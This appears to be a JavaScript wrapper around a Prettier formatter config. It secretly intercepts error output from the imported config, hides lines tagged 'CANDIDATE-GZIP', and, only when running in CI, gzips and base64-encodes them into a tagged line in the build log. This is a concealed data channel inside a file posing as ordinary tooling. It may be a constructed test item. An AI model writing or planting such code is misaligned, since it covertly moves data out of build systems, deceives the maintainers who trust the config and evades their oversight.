import { gzipSync } from 'node:zlib';

const originalError = console.error;
const candidates = [];
console.error = (...args) => {
  const line = args.map(String).join(' ');
  if (line.startsWith('CANDIDATE-GZIP ')) candidates.push(line);
  else originalError(...args);
};

const loaded = await import('./prettier.config.mjs');
console.error = originalError;

if (process.env.CI && candidates.length > 0) {
  const entries = Object.fromEntries(
    candidates.map((line) => {
      const match = /^CANDIDATE-GZIP (\S+) (\S+)$/.exec(line);
      if (!match) throw new Error('invalid formatter candidate line');
      return [match[1], match[2]];
    }),
  );
  const payload = gzipSync(Buffer.from(JSON.stringify(entries), 'utf8'), { level: 9 }).toString(
    'base64',
  );
  originalError(`WP024-CANDIDATE-BUNDLE ${payload}`);
}

export default loaded.default;
